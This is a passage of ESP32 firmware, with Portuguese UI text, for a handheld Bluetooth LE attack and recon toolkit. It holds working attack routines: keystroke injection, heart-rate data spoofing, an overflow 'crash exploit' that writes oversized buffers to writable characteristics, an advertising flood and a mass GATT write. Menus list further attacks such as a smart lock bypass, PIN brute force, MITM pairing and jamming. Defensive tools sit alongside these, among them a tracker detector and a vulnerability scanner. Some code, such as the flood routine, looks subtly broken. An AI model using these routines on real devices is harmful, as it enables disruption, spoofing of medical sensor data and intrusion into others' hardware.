                    0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, // L
                    0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00  // Y
                };
                ch->writeValue(keys, sizeof(keys), false);
            }
        }
    }
    client->disconnect();
    delete client;
    BLEDevice::deinit();
    displayTextLine("Keystrokes injetados!");
    delay(1000);
}

void bleHRMSpoof() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyHRM");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("HRM DATA SPOOF", tftWidth / 2, 28, SMOOTH_FONT);

    uint32_t spoofCount = 0;
    while (!check(EscPress)) {
        NimBLERemoteService* svc = client->getService("180D");
        if (svc) {
            auto chars = svc->getCharacteristics(true);
            for (auto* ch : chars) {
                if (ch->canWrite()) {
                    uint8_t fakeHR[] = {0x00, (uint8_t)random(50, 180)};
                    ch->writeValue(fakeHR, 2, false);
                    spoofCount++;
                }
            }
        }
        bleShowStats(spoofCount, millis(), client->getRssi());
        delay(1000);
    }
    client->disconnect();
    delete client;
    BLEDevice::deinit();
}

void bleESP32Crash() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyESP32Crash");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("ESP32 CRASH EXPLOIT", tftWidth / 2, 28, SMOOTH_FONT);

    uint32_t crashCount = 0;
    while (!check(EscPress)) {
        NimBLERemoteService* svc = client->getService("1800");
        if (svc) {
            auto chars = svc->getCharacteristics(true);
            for (auto* ch : chars) {
                if (ch->canWrite()) {
                    // Send oversized data to trigger buffer overflow
                    std::vector<uint8_t> crashData(600, 0x41);
                    ch->writeValue(crashData.data(), crashData.size(), false);
                    crashCount++;
                }
            }
        }
        bleShowStats(crashCount, millis(), client->getRssi());
        delay(50);
    }
    client->disconnect();
    delete client;
    BLEDevice::deinit();
}

void bleSmartHomeFlood() {
    if (!bleConfirmAction("Smart Home Flood?")) return;

    BLEDevice::init("WilySmartHome");
    uint32_t floodCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("SMART HOME FLOOD", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        NimBLEAdvertisementData adData;
        // Flood with common smart home service UUIDs
        adServiceUUID(NimBLEUUID("180F")); // Battery
        adServiceUUID(NimBLEUUID("180A")); // Device Info
        adServiceUUID(NimBLEUUID("FE95")); // Xiaomi
        adServiceUUID(NimBLEUUID("FE93")); // Google
        adv->setAdvertisementData(adData);
        adv->start();
        delay(50);
        adv->stop();
        floodCount++;
        bleShowStats(floodCount, millis() - startTime, 0);
    }
    BLEDevice::deinit();
}

void bleGATTExploiter() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyGATTExploit");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("GATT EXPLOITER", tftWidth / 2, 28, SMOOTH_FONT);

    uint32_t exploitCount = 0;
    // Discover all services and try to exploit writable characteristics
    auto services = client->getServices(true);
    for (auto* svc : services) {
        auto chars = svc->getCharacteristics(true);
        for (auto* ch : chars) {
            if (ch->canWrite()) {
                uint8_t exploitData[] = {0x00, 0x00, 0xFF, 0xFF};
                ch->writeValue(exploitData, sizeof(exploitData), false);
                exploitCount++;
            }
        }
    }

    tft.fillRect(10, 50, tftWidth - 20, 40, wilyConfig.bgColor);
    tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
    tft.drawCentreString("Explorados: " + String(exploitCount) + " chars", tftWidth / 2, 60, 1);

    client->disconnect();
    delete client;
    BLEDevice::deinit();
    delay(2000);
}

//================================================================================
// 5. MONITORING & DETECTION
//================================================================================

void bleTrackerDetector() {
    displayTextLine("Detector de Trackers...");
    uint32_t scanCount = 0;
    uint32_t trackerCount = 0;

    while (!check(EscPress)) {
        auto results = blePerformScan(3, false);
        for (auto& r : results) {
            bool isTracker = false;
            String trackerType = "";

            // Apple AirTag/FindMy
            if (r.manufacturerData.size() >= 2 && r.manufacturerData[0] == 0x4C && r.manufacturerData[1] == 0x00) {
                isTracker = true;
                trackerType = "Apple FindMy";
            }
            // Samsung SmartTag
            if (r.name.indexOf("SmartTag") >= 0) {
                isTracker = true;
                trackerType = "Samsung SmartTag";
            }
            // Tile
            if (r.name.indexOf("Tile") >= 0 || r.services.size() > 0) {
                if (r.appearance == 0) {
                    isTracker = true;
                    trackerType = "Tile Tracker";
                }
            }

            if (isTracker) {
                trackerCount++;
                tft.fillScreen(TFT_ORANGE);
                tft.setTextColor(TFT_BLACK, TFT_ORANGE);
                tft.setTextSize(FM);
                tft.drawCentreString("TRACKER DETECTADO!", tftWidth / 2, tftHeight / 2 - 30, 1);
                tft.setTextSize(FP);
                tft.drawCentreString(trackerType, tftWidth / 2, tftHeight / 2, 1);
                tft.drawCentreString(r.address, tftWidth / 2, tftHeight / 2 + 20, 1);
                _tone(1500, 300);
                delay(2000);
                tft.fillScreen(wilyConfig.bgColor);
            }
        }
        scanCount++;
        delay(500);
    }
    bleCleanup();
}

void bleDeviceClassifier() {
    displayTextLine("Classificando dispositivos...");
    auto results = blePerformScan(8);

    // Categories
    int keyboards = 0, mice = 0, headphones = 0, speakers = 0;
    int phones = 0, trackers = 0, iot = 0, unknown = 0;

    for (auto& r : results) {
        switch (r.appearance) {
            case 960: keyboards++; break;
            case 962: mice++; break;
            case 236: speakers++; break;
            case 240: headphones++; break;
            case 256: case 257: case 258: phones++; break;
            case 0: unknown++; break;
            default: iot++; break;
        }
    }

    tft.fillScreen(wilyConfig.bgColor);
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("DEVICE CLASSIFIER", tftWidth / 2, 28, SMOOTH_FONT);

    int y = 55;
    tft.setTextSize(FP);
    auto drawCat = [&](const char* name, int count, uint16_t color) {
        if (count == 0) return;
        tft.setTextColor(color, wilyConfig.bgColor);
        tft.drawString(String(name) + ": " + String(count), 10, y);
        y += 16;
    };

    drawCat("Teclados", keyboards, TFT_CYAN);
    drawCat("Mouses", mice, TFT_GREEN);
    drawCat("Fones", headphones, TFT_YELLOW);
    drawCat("Caixas", speakers, TFT_ORANGE);
    drawCat("Phones", phones, TFT_BLUE);
    drawCat("Trackers", trackers, TFT_RED);
    drawCat("IoT", iot, TFT_MAGENTA);
    drawCat("Desconhecido", unknown, TFT_WHITE);

    tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
    tft.drawCentreString("Total: " + String(results.size()), tftWidth / 2, tftHeight - 20, 1);

    bleCleanup();
    delay(5000);
}

void bleNewDeviceAlert() {
    displayTextLine("Alerta de novos dispositivos...");
    std::vector<String> baseline;

    // Initial scan to establish baseline
    auto initial = blePerformScan(5, false);
    for (auto& r : initial) baseline.push_back(r.address);

    tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
    tft.drawCentreString("Baseline: " + String(baseline.size()) + " dispositivos", tftWidth / 2, 60, 1);
    delay(1000);

    uint32_t alertCount = 0;
    while (!check(EscPress)) {
        auto results = blePerformScan(3, false);
        for (auto& r : results) {
            bool isNew = true;
            for (auto& addr : baseline) {
                if (addr == r.address) { isNew = false; break; }
            }
            if (isNew) {
                alertCount++;
                baseline.push_back(r.address);
                // Visual alert
                tft.fillRect(10, 80, tftWidth - 20, 40, TFT_GREEN);
                tft.setTextColor(TFT_BLACK, TFT_GREEN);
                tft.setTextSize(FM);
                tft.drawCentreString("NOVO: " + r.name, tftWidth / 2, 90, 1);
                _tone(2000, 150);
                delay(1500);
                tft.fillRect(10, 80, tftWidth - 20, 40, wilyConfig.bgColor);
            }
        }
        tft.setTextSize(FP);
        tft.setTextColor(TFT_CYAN, wilyConfig.bgColor);
        tft.drawCentreString("Novos: " + String(alertCount), tftWidth / 2, tftHeight - 20, 1);
    }
    bleCleanup();
}

void bleRSSIHeatmap() {
    displayTextLine("Mapa de sinal...");
    auto results = blePerformScan(5);

    tft.fillScreen(wilyConfig.bgColor);
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("RSSI HEATMAP", tftWidth / 2, 28, SMOOTH_FONT);

    int centerX = tftWidth / 2;
    int centerY = tftHeight / 2 + 10;
    int maxRadius = min(tftWidth, tftHeight) / 2 - 30;

    // Draw concentric rings
    for (int r = maxRadius; r > 0; r -= 20) {
        int rssi = map(r, 0, maxRadius, 0, -100);
        uint16_t color;
        if (rssi > -40) color = TFT_GREEN;
        else if (rssi > -60) color = TFT_YELLOW;
        else if (rssi > -80) color = TFT_ORANGE;
        else color = TFT_RED;
        tft.drawCircle(centerX, centerY, r, color);
    }

    // Plot devices
    for (auto& dev : results) {
        int dist = map(dev.rssi, -100, 0, maxRadius, 0);
        int angle = random(0, 360);
        int x = centerX + dist * cos(angle * PI / 180);
        int y = centerY + dist * sin(angle * PI / 180);
        tft.fillCircle(x, y, 4, wilyConfig.priColor);
        tft.setTextSize(1);
        tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
        tft.drawString(dev.name, x + 8, y - 4);
    }

    bleCleanup();
    delay(5000);
}

void bleSecurityAnalyzer() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilySecAnalyze");
    NimBLEClient* client = BLEDevice::createClient();

    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("SECURITY ANALYZER", tftWidth / 2, 28, SMOOTH_FONT);

    int y = 50;
    tft.setTextSize(FP);

    if (client->connect(addr)) {
        tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
        tft.drawString("Conexao: OK", 10, y); y += 16;

        // Check security level
        auto services = client->getServices(true);
        tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
        tft.drawString("Servicos: " + String(services.size()), 10, y); y += 16;

        int writableChars = 0;
        int readableChars = 0;
        for (auto* svc : services) {
            auto chars = svc->getCharacteristics(true);
            for (auto* ch : chars) {
                if (ch->canWrite()) writableChars++;
                if (ch->canRead()) readableChars++;
            }
        }

        tft.drawString("Chars R/W: " + String(readableChars) + "/" + String(writableChars), 10, y); y += 16;
        tft.drawString("RSSI: " + String(client->getRssi()) + " dBm", 10, y); y += 16;

        // Security assessment
        if (writableChars > 0) {
            tft.setTextColor(TFT_RED, wilyConfig.bgColor);
            tft.drawString("RISCO: Caracteristicas", 10, y); y += 16;
            tft.drawString("gravaveis encontradas!", 10, y); y += 16;
        }

        client->disconnect();
    } else {
        tft.setTextColor(TFT_RED, wilyConfig.bgColor);
        tft.drawString("Nao conectou", 10, y); y += 16;
    }

    delete client;
    BLEDevice::deinit();
    delay(5000);
}

void bleVulnScanner() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyVulnScan");
    NimBLEClient* client = BLEDevice::createClient();

    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("VULN SCANNER", tftWidth / 2, 28, SMOOTH_FONT);

    std::vector<BLEVulnCheck> vulns;

    if (client->connect(addr)) {
        // Check 1: Open characteristics
        auto services = client->getServices(true);
        bool hasOpenChars = false;
        for (auto* svc : services) {
            auto chars = svc->getCharacteristics(true);
            for (auto* ch : chars) {
                if (ch->canWrite()) {
                    hasOpenChars = true;
                    break;
                }
            }
            if (hasOpenChars) break;
        }
        vulns.push_back({"Char Abertas", "Chars gravaveis sem auth", hasOpenChars, ""});

        // Check 2: No security
        bool noSec = !client->getSecurityMode();
        vulns.push_back({"Sem Seguranca", "Conexao sem encryption", noSec, ""});

        // Check 3: Large MTU
        bool largeMTU = client->getMTU() > 23;
        vulns.push_back({"MTU Grande", "MTU > 23 pode indicar configs permissivas", largeMTU, ""});

        client->disconnect();
    }

    int y = 50;
    tft.setTextSize(FP);
    for (auto& v : vulns) {
        tft.setTextColor(v.vulnerable ? TFT_RED : TFT_GREEN, wilyConfig.bgColor);
        tft.drawString((v.vulnerable ? "[VULN] " : "[OK] ") + v.name, 10, y);
        y += 16;
    }

    delete client;
    BLEDevice::deinit();
    delay(5000);
}

void bleServiceEnumerator() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyEnum");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    tft.fillScreen(wilyConfig.bgColor);
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("SERVICE ENUMERATOR", tftWidth / 2, 28, SMOOTH_FONT);

    int y = 50;
    tft.setTextSize(FP);
    auto services = client->getServices(true);

    for (auto* svc : services) {
        if (y > tftHeight - 30) break;
        tft.setTextColor(TFT_CYAN, wilyConfig.bgColor);
        tft.drawString("Svc: " + svc->getUUID().toString(), 10, y);
        y += 14;

        auto chars = svc->getCharacteristics(true);
        for (auto* ch : chars) {
            if (y > tftHeight - 20) break;
            String props = "";
            if (ch->canRead()) props += "R";
            if (ch->canWrite()) props += "W";
            if (ch->canNotify()) props += "N";
            tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
            tft.drawString("  " + ch->getUUID().toString() + " [" + props + "]", 10, y);
            y += 12;
        }
    }

    client->disconnect();
    delete client;
    BLEDevice::deinit();
    delay(5000);
}

void bleConnectionQuality() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyConnQ");
    NimBLEClient* client = BLEDevice::createClient();

    if (!client->connect(addr)) {
        displayError("Falha ao conectar");
        delete client;
        BLEDevice::deinit();
        return;
    }

    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("CONNECTION QUALITY", tftWidth / 2, 28, SMOOTH_FONT);

    int goodPkts = 0, badPkts = 0;
    uint32_t startTime = millis();

    while (!check(EscPress)) {
        int rssi = client->getRssi();
        if (rssi > -70) goodPkts++;
        else badPkts++;

        tft.fillRect(10, 50, tftWidth - 20, tftHeight - 80, wilyConfig.bgColor);
        tft.setTextSize(FP);
        tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
        tft.drawString("RSSI: " + String(rssi) + " dBm", 10, 55);
        tft.drawString("Tempo: " + String((millis() - startTime) / 1000) + "s", 10, 73);

        int quality = map(rssi, -100, -30, 0, 100);
        quality = constrain(quality, 0, 100);
        tft.drawString("Qualidade: " + String(quality) + "%", 10, 91);

        uint16_t qColor = quality > 70 ? TFT_GREEN : (quality > 40 ? TFT_YELLOW : TFT_RED);
        tft.drawRect(10, 110, tftWidth - 20, 20, TFT_WHITE);
        tft.fillRect(11, 111, (tftWidth - 22) * quality / 100, 18, qColor);

        tft.drawString("Bons: " + String(goodPkts) + " | Ruins: " + String(badPkts), 10, 140);

        delay(500);
    }
    client->disconnect();
    delete client;
    BLEDevice::deinit();
}

//================================================================================
// MENU SYSTEM
//================================================================================

void bleReconMenu() {
    options = {
        {"Filtro por Nome", bleScanFilterByName},
        {"Filtro por RSSI", bleScanFilterByRSSI},
        {"Filtro por Servico", bleScanFilterByService},
        {"Filtro por Fabricante", bleScanFilterByManufacturer},
        {"Exportar CSV", bleScanExportCSV},
        {"Scan Continuo", bleScanContinuous},
        {"Comparar Sinal", bleScanCompareRSSI},
        {"Rastreador", bleDeviceTracker},
        {"Dispositivos Ocultos", bleScanHiddenDevices},
        {"Watchdog", bleScanWatchdog},
        {"Voltar", bleAdvancedSuiteMenu}
    };
    bleDrawHeader("Reconhecimento BLE", TFT_CYAN);
    bleDrawFooter("SEL: OK", "ESC: Voltar");
    loopOptions(options, MENU_TYPE_SUBMENU, "BLE Recon");
}

void bleAttackMenu() {
    options = {
        {"Relay Attack", bleRelayAttack},
        {"EATT Flood", bleEATTFlood},
        {"Conn Flood DoS", bleConnectionFloodDoS},
        {"Adv Flood DoS", bleAdvertisingFloodDoS},
        {"Param Abuse Drain", bleParamAbuseDrain},
        {"Firmware Crash", bleFirmwareCrash},
        {"Char Overflow", bleCharOverflow},
        {"PIN Brute Force", blePINBruteForce},
        {"Pairing Storm", blePairingStorm},
        {"Replay Attack", bleReplayAttack},
        {"MITM Pairing", bleMITMPair},
        {"BLE Jammer", bleJammerAll},
        {"GATT Confusion", bleGATTConfusion},
        {"L2CAP Flood", bleL2CAPFlood},
        {"Cross-Protocol", bleCrossProtocol},
        {"Voltar", bleAdvancedSuiteMenu}
    };
    bleDrawHeader("Ataques BLE", TFT_RED);
    bleDrawFooter("SEL: OK", "ESC: Voltar");
    loopOptions(options, MENU_TYPE_SUBMENU, "BLE Attacks");
}

void bleUtilityMenu() {
    options = {
        {"Packet Crafter", blePacketCrafter},
        {"Raw Advertising", bleRawAdvertising},
        {"Decoder Mfg Data", bleManufacturerDecoder},
        {"Monitor de Sinal", bleSignalMonitor},
        {"MAC Randomizer", bleMACRandomizer},
        {"Badge Creator", bleBadgeCreator},
        {"Device Clone", bleDeviceClone},
        {"Estimador Distancia", bleDistanceEstimator},
        {"Packet Logger", blePacketLogger},
        {"Firmware Detector", bleFirmwareDetector},
        {"Voltar", bleAdvancedSuiteMenu}
    };
    bleDrawHeader("Utilidades BLE", TFT_GREEN);
    bleDrawFooter("SEL: OK", "ESC: Voltar");
    loopOptions(options, MENU_TYPE_SUBMENU, "BLE Utilities");
}

void bleDeviceExploitMenu() {
    options = {
        {"AirPods Drain", bleAirPodsDrain},
        {"AirPods Crash", bleAirPodsCrash},
        {"Tile Manipulate", bleTileManipulate},
        {"Fitbit Inject", bleFitbitInject},
        {"Smart Lock Bypass", bleSmartLockBypass},
        {"Keyboard Inject", bleKeyboardInject},
        {"HRM Data Spoof", bleHRMSpoof},
        {"ESP32 Crash", bleESP32Crash},
        {"Smart Home Flood", bleSmartHomeFlood},
        {"GATT Exploiter", bleGATTExploiter},
        {"Voltar", bleAdvancedSuiteMenu}
    };
    bleDrawHeader("Exploits por Dispositivo", TFT_ORANGE);
    bleDrawFooter("SEL: OK", "ESC: Voltar");
    loopOptions(options, MENU_TYPE_SUBMENU, "Device Exploits");
}

void bleMonitorMenu() {
    options = {
        {"Tracker Detector", bleTrackerDetector},
        {"Device Classifier", bleDeviceClassifier},
        {"Alerta Novos Disp.", bleNewDeviceAlert},
        {"Mapa de Sinal", bleRSSIHeatmap},
        {"Security Analyzer", bleSecurityAnalyzer},
        {"Vuln Scanner", bleVulnScanner},
        {"Service Enumerator", bleServiceEnumerator},
        {"Connection Quality", bleConnectionQuality},
        {"Voltar", bleAdvancedSuiteMenu}
    };
    bleDrawHeader("Monitoramento BLE", TFT_MAGENTA);
    bleDrawFooter("SEL: OK", "ESC: Voltar");
    loopOptions(options, MENU_TYPE_SUBMENU, "BLE Monitor");
}

void bleAdvancedSuiteMenu() {
    bleShowWelcomeScreen();

    int selected = 0;
    int lastSelected = -1;

    while (true) {
        if (selected != lastSelected) {
            int startY = 120;
            struct { const char* label; uint16_t color; const char* icon; } cats[] = {
                {"Reconhecimento", TFT_CYAN,    "R"},
                {"Ataques",        TFT_RED,     "A"},
                {"Utilidades",     TFT_GREEN,   "U"},
                {"Exploits",       TFT_ORANGE,  "E"},
                {"Monitoramento",  TFT_MAGENTA, "M"},
            };

            for (int i = 0; i < 5; i++) {
                int cy = startY + i * 22;
                bool sel = (i == selected);
                bleDrawCard(cy, 20, sel);
                tft.fillCircle(24, cy + 10, 8, cats[i].color);
                tft.setTextSize(FP);
                tft.setTextColor(TFT_BLACK, cats[i].color);
                tft.setTextDatum(TC_DATUM);
                tft.drawString(cats[i].icon, 24, cy + 6, 1);
                tft.setTextDatum(TL_DATUM);
                tft.setTextColor(sel ? TFT_BLACK : BLE_COLOR_TEXT, sel ? BLE_COLOR_PRIMARY : getColorVariation(BLE_COLOR_PRIMARY, 4, -1));
                tft.drawString(cats[i].label, 38, cy + 5);
            }
            lastSelected = selected;
        }

        if (check(SelPress)) {
            void (*funcs[])() = { bleReconMenu, bleAttackMenu, bleUtilityMenu, bleDeviceExploitMenu, bleMonitorMenu };
            funcs[selected]();
            // After returning from submenu, redraw welcome
            bleShowWelcomeScreen();
            lastSelected = -1;
        }
        if (check(EscPress)) {
            returnToMenu = true;
            return;
        }
        if (check(UpPress)) { selected = max(0, selected - 1); lastSelected = -1; }
        if (check(DownPress)) { selected = min(4, selected + 1); lastSelected = -1; }
        delay(80);
    }
}
